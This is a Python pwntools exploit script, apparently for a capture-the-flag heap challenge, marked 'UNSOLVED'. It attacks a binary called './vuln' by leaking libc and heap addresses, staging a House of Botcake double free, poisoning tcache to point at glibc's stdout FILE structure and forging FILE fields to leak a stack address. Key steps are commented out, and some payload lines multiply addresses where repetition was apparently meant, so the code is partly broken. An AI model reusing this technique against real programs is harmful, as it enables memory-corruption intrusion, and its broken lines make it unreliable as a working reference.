#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './vuln'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

def alloc(idx, size, content):
    log.info('===== ALLOCATING =====')
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'idx:', str(idx).encode())
    io.sendlineafter(b'size:', str(size).encode())
    io.sendlineafter(b'content:', content)
    
def free(idx):
    log.info('====== FREEING ======')
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'idx:', str(idx).encode())
    
def read(idx):
    log.info('====== READING ======')
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'idx:', str(idx).encode())
    return io.recvline()

def cleanup(iter, size):
    for i in range(iter):
        alloc(i, size, 'AAAA')

# =========================================================
#                   EXPLOITS (UNSOLVED)
# =========================================================
io = initialize()

# leaking libc
# allocate two chunks to prevent the chunk coalesce to the wilderness 
# instead go to the unsorted bins
alloc(0, 1350, 'AAAA')
alloc(1, 1350, 'BBBB')
free(0)
main_arena = unpack(read(0).strip().ljust(8, b'\x00'))
libc.address = main_arena - 0x219ce0

# leaking heap address
alloc(0, 64, 'AAAA')
free(0)
leak = unpack(read(0).strip().ljust(8, b'\x00'))
heap = ( leak << 12 ) - 0x2000

# # cleaning up bins caused by seccomps
cleanup(7, 0x10)
cleanup(1, 0x40)
cleanup(7, 0x60)
cleanup(7, 0x70)
cleanup(5, 0xc0)
cleanup(2, 0xe0)
cleanup(7, 0x100)
cleanup(10, 0x30)
cleanup(10, 0x20)
cleanup(10, 0x10)

# House of Botcake 
for i in range(7): 
    alloc(i, 0x200, 'AAAA')
    
alloc(11, 0x200, 'victim')
alloc(12, 0x200, 'prev')
alloc(13, 0x10, 'prevention')

for i in range(7): # filling tcache
    free(i)

free(11)                    # free victim, goes to unsorted bin 
free(12)                    # free prev, now consolidated with victim
alloc(5, 0x200, 'tcache')   # open a slot in tcache
free(11)                    # victim double free, now victim is in tcache

#                  prev                   |                 victim                  # both consolidated on unsorted bin
#  --------------------------------------- ---------------------------------------  # so this is a single chunk
#   0x8 |               0x108             | 0x20  |                                 # requesting 0x130 sized chunk. 0x8 prev size, 0x100 data, 0x8 metadata
                                                                                    # which we use to corrupt victim chunk's fd                                                           

# achieving arbitrary write to FILE* stdout                                                                                    
stdout = libc.sym['_IO_2_1_stdout_']
payload = b'P' * 208                                # data padding
payload += p64(0x211)                               # preserving the victim's size metadata
payload += p64((stdout ^ ((heap + 0x4040) >> 12) ))    # bypassing safe-linked ptr, ((chunk_location) >> 12)
# alloc(1, 0x230, payload)                            # corrupting victim chunk's
# alloc(2, 0x200, 'AAAA')                             # removing victim from tcache, updating linked list structure, gaining arbitary write
                                                    # now tcache is pointing to FILE* stdout
                                                    # now next allocation should be located on FILE* stdout! 

# corrupting FILE* stdout
environ = libc.sym['environ']
payload = flat([
    0xfbad1800,             # flags
    environ * 3,            # read_ptr, read_end, read_base
    environ,                # write_base
    (environ + 0x8) * 2,    # write_ptr and write_end
    (environ + 0x8) * 2,    # buf_base and buf_end
])
# alloc(3, 0x200, payload)                            

# stack leak
# stack = unpack(io.recv(8)[:-1].ljust(8, b'\x00'))

# logging information
log.info('libc base address: %#x', libc.address)
log.info('heap base address: %#x', heap)
log.info('libc stdout: %#x', stdout)
log.info('test : %#x', (stdout ^ ((heap + 0x4040) >> 12) ))
# log.info('stack leak : %#x', stack)

io.interactive()